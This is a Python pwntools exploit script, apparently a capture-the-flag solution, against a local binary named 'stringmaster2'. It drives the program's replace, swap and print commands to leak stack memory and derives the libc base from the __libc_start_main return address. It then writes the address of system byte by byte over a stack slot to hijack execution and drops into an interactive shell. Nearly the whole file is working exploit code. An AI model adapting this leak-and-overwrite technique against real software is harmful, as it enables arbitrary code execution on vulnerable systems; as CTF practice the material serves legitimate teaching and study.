from pwn import *

p=process('./stringmaster2')
e=ELF('./stringmaster2')
lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def replace(p,a,b):
    p.sendlineafter('\n> ','replace\n')
    p.sendline("{} {}".format(a,b))
    log.info("[REPLACING]")

def swap(p,a,b):
    p.sendlineafter('\n> ','swap\n')
    p.sendline("{} {}".format(a,b))
    log.info("[SWAPING]")


def print_info(p):
    p.recvuntil('\n> ')
    p.sendline('print\n')
    log.info("[DATA LEAKING]")
    return p.recvuntil("\nEnter the command you want to execute:", drop = True)

def quit(p):
    p.sendlineafter('\n> ','quit\n')
    log.info('[QUITING]')

def trans1(p):
    s = [ b'\xa7', b'\x11', b'\x40']
    for i in range(3):
        replace(p,str1[i],s[i])
def trans2(p):
    for i in range(3):
        swap(p,i,i+0x88)


p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()

log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
replace(p,'X','x')
log.info("[LEAKED DATA]")
print "[BEFORE]"
leak=print_info(p)
print hexdump(leak)

extract=u64(leak[0x88:0x88+7].ljust(8,'\x00'))
log.info('[LIBC_START_m_231 ADDRESS]: '+hex(extract))
libc_base=extract-lib.sym['__libc_start_main']-231
log.info('[LIBC_BASE]: '+hex(libc_base))
idx=0x78
sys=libc_base+lib.sym['system']
log.info('[SYSTEM]: '+hex(sys))
for i in range(7):
    replace(p,str1[i],p64(sys)[i])
    sleep(0.5)
    swap(p,i,i+idx)

# trans1(p)
# trans2(p)
print hexdump(print_info(p))
p.interactive()

